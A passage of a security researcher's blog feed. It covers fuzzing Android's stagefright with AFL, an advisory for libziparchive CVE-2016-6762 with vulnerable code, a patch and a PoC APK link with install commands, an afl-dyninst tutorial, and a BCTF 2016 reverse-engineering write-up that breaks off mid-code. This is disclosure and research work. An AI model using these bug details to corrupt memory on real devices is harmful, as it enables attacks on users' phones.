<p>或者</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LOCAL_SANITIZE := integer</div></pre></td></tr></table></figure>
<p>最后，重新编译stagefright。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ mm -j16</div></pre></td></tr></table></figure>
<p>对于复杂的模块来说，你需要重复上面步骤数次，以对多个感兴趣的模块进行插桩。例如，你也许想要对以下模块进行插桩。</p>
<ul>
<li>$ANDROID_BUILD_TOP/frameworks/av/media/libstagefright</li>
<li>$ANDROID_BUILD_TOP/frameworks/av/media/libstagefright/omx</li>
<li>$ANDROID_BUILD_TOP/frameworks/av/media/libstagefright/yuv</li>
<li>$ANDROID_BUILD_TOP/frameworks/av/media/libstagefright/colorconversion</li>
<li>$ANDROID_BUILD_TOP/frameworks/av/media/libstagefright/codecs/aacenc</li>
<li>$ANDROID_BUILD_TOP/frameworks/av/media/libstagefright/matroska</li>
<li>$ANDROID_BUILD_TOP/frameworks/av/media/libstagefright/filters</li>
<li>$ANDROID_BUILD_TOP/frameworks/av/media/libstagefright/webm</li>
<li>$ANDROID_BUILD_TOP/frameworks/av/media/libstagefright/mpeg2ts</li>
<li>$ANDROID_BUILD_TOP/frameworks/av/media/libstagefright/id3</li>
<li>…more…</li>
</ul>
<p>恭喜你，所有准备工作都已经完成了，让我们开始模糊测试吧！</p>
<h3 id="模糊测试"><a href="#模糊测试" class="headerlink" title="模糊测试"></a>模糊测试</h3><p>首先，你需要为AFL创建两个目录，一个为in，用于存放预先准备的输入样本；另一个为out，用于存放AFL模糊测试过程中生产的一些有用信息以及自动生成的会让程序挂起或者崩溃的样本。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ mkdir <span class="keyword">in</span></div><div class="line">$ mkdir out</div><div class="line">$ cp -r testcase/* <span class="keyword">in</span></div></pre></td></tr></table></figure>
<p>其次，你需要以root用户修改/proc/sys/kernel/core_pattern，以修复<strong>Pipe at the beginning of ‘core_pattern’</strong>这个错误。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ sudo <span class="_">-s</span></div><div class="line">$ <span class="built_in">echo</span> core &gt;/proc/sys/kernel/core_pattern</div></pre></td></tr></table></figure>
<p>接着，你还需要设置CPU的工作模式为performance，以此来提高AFL的效率。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ sudo <span class="_">-s</span></div><div class="line">$ <span class="built_in">cd</span> /sys/devices/system/cpu</div><div class="line">$ <span class="built_in">echo</span> performance | tee cpu*/cpufreq/scaling_governor</div></pre></td></tr></table></figure>
<p>如果使用了ASAN，你可能需要执行以下命令。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">export</span> ASAN_OPTIONS=abort_on_error=1:detect_leaks=0:symbolize=0:allocator_may_return_null=1</div></pre></td></tr></table></figure></p>
<p>最后，执行以下命令开始模糊测试。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ afl-fuzz -m 4096 -t 10000 -i <span class="keyword">in</span> -o out -- /system/bin/stagefright @@</div></pre></td></tr></table></figure>
<p>如果一切顺利，你将看到类似的AFL的工作屏幕。</p>
<p><img src="/images/Use-AFL-For-Stagefright-Fuzzing-On-Linux_5.png" alt="5"></p>
<h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><p>在这一节，我们将给你一些额外的建议，以帮助你更快的发现程序中的漏洞。</p>
<ul>
<li>使用尽可能小但覆盖全面的测试样本集；</li>
<li>对于你想要进行模糊测试的模块，尽可能的编译为静态模块而不是动态模块；</li>
<li>不要对你不敢兴趣的模块进行插桩；</li>
<li>使用并行模糊测试（-M选项和-S选项），更多介绍请参考AFL源码目录中的 docs/parallel_fuzzing.txt；</li>
<li>ASAN需要大量的内存，因此你应该提高-m选项的值。</li>
</ul>
<h2 id="待办事项"><a href="#待办事项" class="headerlink" title="待办事项"></a>待办事项</h2><p>本文还有许多可以改进的地方，但是我们不会在stagefright花费过多的精力了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;模糊测试是一种自动向程序传递输入数据并监控其输出的自动化测试技术。通过这种技术，安全人员可以测试程序的可靠性以及识别潜在的安全漏洞。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Details of Elevation of privilege vulnerability in libziparchive (CVE-2016-6762)</title>
    <link href="http://ele7enxxh.com/Details-Of-Elevation-Of-Privilege-Vulnerability-In-Libziparchive-CVE-2016-6762.html"/>
    <id>http://ele7enxxh.com/Details-Of-Elevation-Of-Privilege-Vulnerability-In-Libziparchive-CVE-2016-6762.html</id>
    <published>2016-12-15T11:54:00.000Z</published>
    <updated>2016-12-19T01:32:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>Details of Elevation of privilege vulnerability in libziparchive<a id="more"></a></p>
<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>An Integer overflow vulnerability in libziparchive when opening a ZIP archive that contains a large number of CD offset and size could allow attackers to trigger an out-of-bounds access or cause a denial of service.</p>
<p>CVE: CVE-2016-6762<br>BugID: A-31251826<br>Severity: High<br>Updated Google devices: All<br>Updated AOSP versions: 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0<br>Author: <a href="http://weibo.com/ele7enxxh" target="_blank" rel="external">ele7enxxh</a> of Chengdu Security Response Center, Qihoo 360 Technology Co. Ltd</p>
<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>The vulnerable code is as follows:<br><a href="http://androidxref.com/7.0.0_r1/xref/system/core/libziparchive/zip_archive.cc#272" target="_blank" rel="external">http://androidxref.com/7.0.0_r1/xref/system/core/libziparchive/zip_archive.cc#272</a><br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="number">254</span>  <span class="keyword">const</span> <span class="keyword">off64_t</span> eocd_offset = search_start + i;</div><div class="line">...</div><div class="line"><span class="number">272</span>  <span class="keyword">if</span> (eocd-&gt;cd_start_offset + eocd-&gt;cd_size &gt; eocd_offset) &#123;</div><div class="line"><span class="number">273</span>    ALOGW(<span class="string">"Zip: bad offsets (dir %"</span> PRIu32 <span class="string">", size %"</span> PRIu32 <span class="string">", eocd %"</span> PRId64 <span class="string">")"</span>,</div><div class="line"><span class="number">274</span>        eocd-&gt;cd_start_offset, eocd-&gt;cd_size, <span class="keyword">static_cast</span>&lt;<span class="keyword">int64_t</span>&gt;(eocd_offset));</div><div class="line"><span class="number">275</span>    <span class="keyword">return</span> kInvalidOffset;</div><div class="line"><span class="number">276</span>  &#125;</div><div class="line"><span class="number">277</span>  <span class="keyword">if</span> (eocd-&gt;num_records == <span class="number">0</span>) &#123;</div><div class="line"><span class="number">278</span>    ALOGW(<span class="string">"Zip: empty archive?"</span>);</div><div class="line"><span class="number">279</span>    <span class="keyword">return</span> kEmptyArchive;</div><div class="line"><span class="number">280</span>  &#125;</div><div class="line"><span class="number">281</span></div><div class="line"><span class="number">282</span>  ALOGV(<span class="string">"+++ num_entries=%"</span> PRIu32 <span class="string">" dir_size=%"</span> PRIu32 <span class="string">" dir_offset=%"</span> PRIu32,</div><div class="line"><span class="number">283</span>        eocd-&gt;num_records, eocd-&gt;cd_size, eocd-&gt;cd_start_offset);</div><div class="line"><span class="number">284</span></div><div class="line"><span class="number">285</span>  <span class="comment">/*</span></div><div class="line">286   * It all looks good.  Create a mapping for the CD, and set the fields</div><div class="line">287   * in archive.</div><div class="line">288   */</div><div class="line"><span class="number">289</span>  <span class="keyword">if</span> (!archive-&gt;directory_map.create(debug_file_name, fd,</div><div class="line"><span class="number">290</span>          <span class="keyword">static_cast</span>&lt;<span class="keyword">off64_t</span>&gt;(eocd-&gt;cd_start_offset),</div><div class="line"><span class="number">291</span>          <span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(eocd-&gt;cd_size), <span class="literal">true</span> <span class="comment">/* read only */</span>) ) &#123;</div><div class="line"><span class="number">292</span>    <span class="keyword">return</span> kMmapFailed;</div><div class="line"><span class="number">293</span>  &#125;</div></pre></td></tr></table></figure></p>
<p>The <code>eocd_offset</code> is 64bit integers, however both <code>cd_start_offset</code> and <code>cd_size</code> are 32bit integers:<br><a href="http://androidxref.com/7.0.0_r1/xref/system/core/libziparchive/zip_archive_common.h#29" target="_blank" rel="external">http://androidxref.com/7.0.0_r1/xref/system/core/libziparchive/zip_archive_common.h#29</a><br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="number">29</span><span class="keyword">struct</span> EocdRecord &#123;</div><div class="line">...</div><div class="line"><span class="number">53</span>  <span class="comment">// The size of the central directory (in bytes).</span></div><div class="line"><span class="number">54</span>  <span class="keyword">uint32_t</span> cd_size;</div><div class="line"><span class="number">55</span>  <span class="comment">// The offset of the start of the central directory, relative</span></div><div class="line"><span class="number">56</span>  <span class="comment">// to the start of the file.</span></div><div class="line"><span class="number">57</span>  <span class="keyword">uint32_t</span> cd_start_offset;</div><div class="line">...</div><div class="line"><span class="number">63</span>&#125; __attribute__((packed));</div></pre></td></tr></table></figure></p>
<p>The boundary check of an invalid EOCD record succeed due to the integer overflow in <code>eocd-&gt;cd_start_offset + eocd-&gt;cd_size</code>, as for the invocation of <code>archive-&gt;directory_map.create()</code>:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="number">121b</span>ool FileMap::create(<span class="keyword">const</span> <span class="keyword">char</span>* origFileName, <span class="keyword">int</span> fd, <span class="keyword">off64_t</span> offset, <span class="keyword">size_t</span> length,</div><div class="line"><span class="number">122</span>        <span class="keyword">bool</span> readOnly)</div><div class="line"><span class="number">123</span>&#123;</div><div class="line">...</div><div class="line"><span class="number">163</span>    <span class="keyword">int</span>     prot, flags, adjust;</div><div class="line"><span class="number">164</span>    <span class="keyword">off64_t</span> adjOffset;</div><div class="line"><span class="number">165</span>    <span class="keyword">size_t</span>  adjLength;</div><div class="line"><span class="number">166</span></div><div class="line"><span class="number">167</span>    <span class="keyword">void</span>* ptr;</div><div class="line"><span class="number">168</span></div><div class="line"><span class="number">169</span>    assert(fd &gt;= <span class="number">0</span>);</div><div class="line"><span class="number">170</span>    assert(offset &gt;= <span class="number">0</span>);</div><div class="line"><span class="number">171</span>    assert(length &gt; <span class="number">0</span>);</div><div class="line"><span class="number">172</span></div><div class="line"><span class="number">173</span>    <span class="comment">// init on first use</span></div><div class="line"><span class="number">174</span>    <span class="keyword">if</span> (mPageSize == <span class="number">-1</span>) &#123;</div><div class="line"><span class="number">175</span>        mPageSize = sysconf(_SC_PAGESIZE);</div><div class="line"><span class="number">176</span>        <span class="keyword">if</span> (mPageSize == <span class="number">-1</span>) &#123;</div><div class="line"><span class="number">177</span>            ALOGE(<span class="string">"could not get _SC_PAGESIZE\n"</span>);</div><div class="line"><span class="number">178</span>            <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line"><span class="number">179</span>        &#125;</div><div class="line"><span class="number">180</span>    &#125;</div><div class="line"><span class="number">181</span></div><div class="line"><span class="number">182</span>    adjust = offset % mPageSize;</div><div class="line"><span class="number">183</span>    adjOffset = offset - adjust;</div><div class="line"><span class="number">184</span>    adjLength = length + adjust;</div><div class="line"><span class="number">185</span></div><div class="line"><span class="number">186</span>    flags = MAP_SHARED;</div><div class="line"><span class="number">187</span>    prot = PROT_READ;</div><div class="line"><span class="number">188</span>    <span class="keyword">if</span> (!readOnly)</div><div class="line"><span class="number">189</span>        prot |= PROT_WRITE;</div><div class="line"><span class="number">190</span></div><div class="line"><span class="number">191</span>    ptr = mmap(<span class="literal">NULL</span>, adjLength, prot, flags, fd, adjOffset);</div></pre></td></tr></table></figure></p>
<p>The <code>length</code>(<code>eocd-&gt;cd_start_offset</code> with aligned/adjusted) and <code>offset</code>(<code>eocd-&gt;cd_size</code> with aligned/adjusted) arguments to the <code>mmap</code> function are invalid, which would lead to a heap overflow on when writing past the heap boundary during the invocation of <code>ParseZipArchive()</code>.</p>
<h2 id="Attack-vector"><a href="#Attack-vector" class="headerlink" title="Attack vector"></a>Attack vector</h2><p>The Poc of corrupting the heap is as follows:<br><a href="https://github.com/ele7enxxh/poc-exp/blob/master/CVE-2016-6762/CVE-2016-6762.apk" target="_blank" rel="external">https://github.com/ele7enxxh/poc-exp/blob/master/CVE-2016-6762/CVE-2016-6762.apk</a><br><code>adb install CVE-2016-6762.apk</code><br><code>dexdump CVE-2016-6762.apk</code></p>
<h2 id="Patches"><a href="#Patches" class="headerlink" title="Patches"></a>Patches</h2><p>Fix out of bound access in libziparchive:<br><a href="https://android.googlesource.com/platform/system/core/+/1ee4892e66ba314131b7ecf17e98bb1762c4b84c" target="_blank" rel="external">https://android.googlesource.com/platform/system/core/+/1ee4892e66ba314131b7ecf17e98bb1762c4b84c</a><br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">diff --git a/libziparchive/zip_archive.cc b/libziparchive/zip_archive.cc</div><div class="line">index <span class="number">87</span>dac0e.<span class="number">.54</span>d866c <span class="number">100644</span></div><div class="line">--- a/libziparchive/zip_archive.cc</div><div class="line">+++ b/libziparchive/zip_archive.cc</div><div class="line">@@ <span class="number">-501</span>,<span class="number">9</span> +<span class="number">501</span>,<span class="number">14</span> @@</div><div class="line">    * Grab the CD offset and size, and the number of entries in the</div><div class="line">    * archive and verify that they look reasonable.</div><div class="line">    */</div><div class="line">-  <span class="keyword">if</span> (eocd-&gt;cd_start_offset + eocd-&gt;cd_size &gt; eocd_offset) &#123;</div><div class="line">+  <span class="keyword">if</span> (<span class="keyword">static_cast</span>&lt;<span class="keyword">off64_t</span>&gt;(eocd-&gt;cd_start_offset) + eocd-&gt;cd_size &gt; eocd_offset) &#123;</div><div class="line">     ALOGW(<span class="string">"Zip: bad offsets (dir %"</span> PRIu32 <span class="string">", size %"</span> PRIu32 <span class="string">", eocd %"</span> PRId64 <span class="string">")"</span>,</div><div class="line">         eocd-&gt;cd_start_offset, eocd-&gt;cd_size, <span class="keyword">static_cast</span>&lt;<span class="keyword">int64_t</span>&gt;(eocd_offset));</div><div class="line">+<span class="meta">#<span class="meta-keyword">if</span> defined(__ANDROID__)</span></div><div class="line">+    <span class="keyword">if</span> (eocd-&gt;cd_start_offset + eocd-&gt;cd_size &lt;= eocd_offset) &#123;</div><div class="line">+      android_errorWriteLog(<span class="number">0x534e4554</span>, <span class="string">"31251826"</span>);</div><div class="line">+    &#125;</div><div class="line">+<span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">     <span class="keyword">return</span> kInvalidOffset;</div><div class="line">   &#125;</div><div class="line">   <span class="keyword">if</span> (eocd-&gt;num_records == <span class="number">0</span>) &#123;</div></pre></td></tr></table></figure></p>
<h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><p>2016–08-28: Android bug reported to Google<br>2016-09-20: Android bug confirmed and the severity is set to High<br>2016-12-05: Android security bulletin released with fix<br>2016-12-08: Public disclosure</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Details of Elevation of privilege vulnerability in libziparchive
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>使用afl-dyninst fuzz无源码的二进制程序</title>
    <link href="http://ele7enxxh.com/Use-AFL-dyninst-To-Fuzz-Blackbox-Binaries.html"/>
    <id>http://ele7enxxh.com/Use-AFL-dyninst-To-Fuzz-Blackbox-Binaries.html</id>
    <published>2016-09-14T03:40:00.000Z</published>
    <updated>2016-09-14T03:48:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>通常来讲,afl-fuzz需要对待fuzz程序重编译,重而对其进行插桩,这就要求拥有待fuzz程序的完整源代码。而afl-dyninst提供了一种静态无源码插桩的手段使得可以对无源码二进制程序插桩。<a id="more"></a></p>
<p>本文的测试系统为:ubuntu14.04。</p>
<h2 id="下载-amp-amp-编译"><a href="#下载-amp-amp-编译" class="headerlink" title="下载&amp;&amp;编译"></a>下载&amp;&amp;编译</h2><p>首先需要安装以下软件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install libelf-dev libelf1 libiberty-dev libboost-all-dev</div></pre></td></tr></table></figure></p>
<p>afl-dyninst是基于dyninst的,所以需要下载&amp;&amp;编译&amp;&amp;安装dyninst:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/dyninst/dyninst.git</div><div class="line">cd dyninst</div><div class="line">mkdir build</div><div class="line">cd build</div><div class="line">cmake -DBOOST_LIBRARYDIR=/usr/lib/x86_64-linux-gnu</div><div class="line">make</div><div class="line">sudo make install</div></pre></td></tr></table></figure></p>
<p>下载&amp;&amp;编译afl-dyninst<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/talos-vulndev/afl-dyninst.git</div><div class="line">cd afl-dyninst</div><div class="line">make</div><div class="line">sudo cp afl-dyninst /usr/bin/</div><div class="line">sudo cp libAflDyninst.so /usr/local/lib/</div><div class="line">echo &quot;/usr/local/lib&quot; &gt; /etc/ld.so.conf.d/dyninst.conf &amp;&amp; ldconfig</div><div class="line">echo &quot;export DYNINSTAPI_RT_LIB=/usr/local/lib/libdyninstAPI_RT.so&quot; &gt;&gt; ~/.bashrc</div></pre></td></tr></table></figure></p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">Usage: ./afl-dyninst -i &lt;binary&gt; -o &lt;binary&gt; -l &lt;library&gt; -e &lt;address&gt; -s &lt;number&gt;</div><div class="line">             -i: Input binary </div><div class="line">             -o: Output binary</div><div class="line">             -l: Library to instrument (repeat for more than one)</div><div class="line">             -e: Entry point address to patch (required for stripped binaries)</div><div class="line">             -r: Runtime library to instrument (path to, repeat for more than one)</div><div class="line">             -s: Number of basic blocks to skip</div><div class="line">             -v: Verbose output</div><div class="line">example:</div><div class="line">afl-dyninst -i testbin -o testbin_ins</div><div class="line">to fuzz:</div><div class="line">export AFL_SKIP_BIN_CHECK=1</div><div class="line">afl-fuzz -i in -o out testbin_ins</div></pre></td></tr></table></figure>
<h2 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h2><p>dyninst目前支持POWER/Linux, x86/Linux, x86_64/Linux,x86/Windows XP/2000/2003/Windows 7多个平台以及aarch64,不过可惜的是不支持arm/thumb。afl-dyninst于15年3月公布,不过到目前为止还未添加到afl-fuzz的发行版本中,推测其应该存在较多的bug。不过dyninst项目目前仍然活跃,相信以后会更加成熟。持续关注中!</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;通常来讲,afl-fuzz需要对待fuzz程序重编译,重而对其进行插桩,这就要求拥有待fuzz程序的完整源代码。而afl-dyninst提供了一种静态无源码插桩的手段使得可以对无源码二进制程序插桩。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>bctf 2016 LostFlower writeup</title>
    <link href="http://ele7enxxh.com/Bctf-2016-LostFlower-Writeup.html"/>
    <id>http://ele7enxxh.com/Bctf-2016-LostFlower-Writeup.html</id>
    <published>2016-03-23T04:50:00.000Z</published>
    <updated>2016-03-23T06:30:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文为2016年bctf中的LostFlower的writeup。<a id="more"></a></p>
<p><img src="/images/bctf-2016-LostFlower-writeup-1.png" alt="1"></p>
<h2 id="LostFlower-writeup"><a href="#LostFlower-writeup" class="headerlink" title="LostFlower writeup"></a>LostFlower writeup</h2><p>首先<a href="/downloads/bctf-2016-LostFlower.zip">点我</a>下载题目，直接使用jeb反编译，入口代码如下：<br><img src="/images/bctf-2016-LostFlower-writeup-2.png" alt="2"><br>可以看到，Java逻辑十分简单，首先获取用户输入，然后调用<code>Double.parseDouble</code>将其转为Double类型（这意味着输入数据必须为合法的Double数据），接着将其作为参数传递给native层的<code>stringFromJNI</code>，如果返回值为6，则调用<code>stringFromJNI2</code>，其返回值即为Flag。<br>使用IDA反汇编，结果如下：<br><img src="/images/bctf-2016-LostFlower-writeup-3.png" alt="3"><br>可以看到，SO进行了高强度的混淆，加入了大量的while、if等无用指令。<br>对<code>stringFromJNI</code>使用f5，奇怪的是，经过对f5伪代码的分析，并没有发现有对用户输入进行校验的地方，难道是程序做了处理，导致f5出现了错误？静态分析解决不了，我们就用动态调试。SO没有做任何反调试处理，而且发现动态调试时，<code>stringFromJNI</code>的f5可以得到正确的伪代码。<br>由于汇编代码含有大量的无效跳转，因此我们选择直接在伪代码的基础上进行动态调试，经过几轮动态调试，发现<code>stringFromJNI</code>包含3处关键代码（即有对输入数据进行判断或处理的地方），如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line"><span class="comment">// 第68行</span></div><div class="line">  v59 = a4; <span class="comment">// a4为输入值的小数部分</span></div><div class="line">  v58 = a3; <span class="comment">// a3为输入值的整数部分</span></div><div class="line">  v67 = _stack_chk_guard;</div><div class="line">  v60 = j_j___aeabi_d2iz(a3, a4);   <span class="comment">// v60为输入值的整数部分</span></div><div class="line">...</div><div class="line"><span class="comment">// 第112行</span></div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v6 &gt; <span class="number">814185195</span> )</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> ( v6 == (<span class="keyword">void</span> *)<span class="number">814185196</span> )</div><div class="line">&#123;</div><div class="line">  v6 = &amp;unk_60130C76;</div><div class="line">  <span class="keyword">if</span> ( v65 &lt;= <span class="number">1000000000</span> )  <span class="comment">// v65为输入值的整数部分</span></div><div class="line">    v6 = (<span class="keyword">void</span> *)<span class="number">306644219</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">···</div><div class="line"><span class="comment">// 第398行</span></div><div class="line">  v13 = check1(*v62);   <span class="comment">// *v62为输入值的整数部分</span></div><div class="line">  v14 = <span class="number">1</span>;</div><div class="line">  <span class="keyword">if</span> ( !v13 )</div><div class="line">    v14 = <span class="number">0</span>;</div><div class="line">  v63 = v14;</div><div class="line">  v4 = (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="number">-439993678</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v4 == (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="number">-439993678</span> )</div><div class="line">&#123;</div><div class="line">  v9 = (<span class="keyword">unsigned</span> __int8)v63;</div><div class="line">  v4 = (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;unk_662944DE;</div><div class="line">  <span class="keyword">goto</span> LABEL_49;</div><div class="line">&#125;</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>从上面的代码我们可以得出以下3点结论：</p>
<ol>
<li><code>stringFromJNI</code>只对输入Double数据的整数部分做处理。</li>
<li><code>stringFromJNI</code>将整数部分和1000000000做比较，根据大小不同，进入不同的分支。</li>
<li><code>stringFromJNI</code>调用了<code>check1</code>，参数为整数部分，根据返回值是否为1，进入不同的分支。</li>
</ol>
<p>现在我们开始脑洞一番，一般情况下，我们测试的时候，不会输入一个大于1000000000的数据，基于这一点我们猜测输入数据应大于1000000000；程序员的逻辑中，返回1是真，0是假，因此我们猜测<code>check1</code>的返回应为1。现在我们测试一番，首先在check1的后面一行下断点，接着输入一个大于1000000000的数据，如1000000001，点击提交按钮，程序断下来以后，可以看到r0为0，修改r0为1，最后让程序继续运行，可以发现，程序成功打印出了Flag，然而由于我们是直接修改的返回值，而输入依然是错误的，自然这个Flag也是错误的。不过，可以确定的是我们的猜测是正确的，即输入数据应大于1000000000并且<code>check1</code>的返回值为1。因此现在的关键即为分析<code>check1</code>，同样在动态分析时，对<code>check1</code>进行f5得到伪代码，<code>check1</code>的逻辑要更加简单一点，我们可以直接采用逆推的方法，也就是从出口（return）开始，往函数入口方向逆向推理的过程。逆推过程这里不再详述，只需要注意以下3点即可加快效率：</p>
<ol>
<li>不要在意大于或小于的比较，我们只需要关注等于时的分支。</li>
<li>在IDA里，你可以选择一个值，此时所有这个值都会标黄，从而可以快速找到下一个值。</li>
<li>我们可以直接在IDA f5伪代码里下断点，也就是说可以直接以伪代码级别调试。</li>
</ol>
<p>给出逆推的结果，代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line"><span class="comment">// 第134行</span></div><div class="line"><span class="keyword">if</span> ( v2 == (<span class="keyword">void</span> *)<span class="number">-427046904</span> )</div><div class="line">&#123;</div><div class="line">LABEL_15:</div><div class="line">    v2 = (<span class="keyword">void</span> *)<span class="number">196778168</span>;</div><div class="line">    LOBYTE(v1) = <span class="number">1</span>; <span class="comment">// 2）就是这里，v1赋值为1了，也就是说我们要找到v2 = -427046904的地方。</span></div><div class="line">&#125;</div><div class="line">...</div><div class="line">                    &#125;</div><div class="line">                    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v2 &gt; <span class="number">-109345567</span> )</div><div class="line">                      <span class="keyword">break</span>;</div><div class="line">                    <span class="keyword">if</span> ( v2 == (<span class="keyword">void</span> *)<span class="number">-242797719</span> )</div><div class="line">                      <span 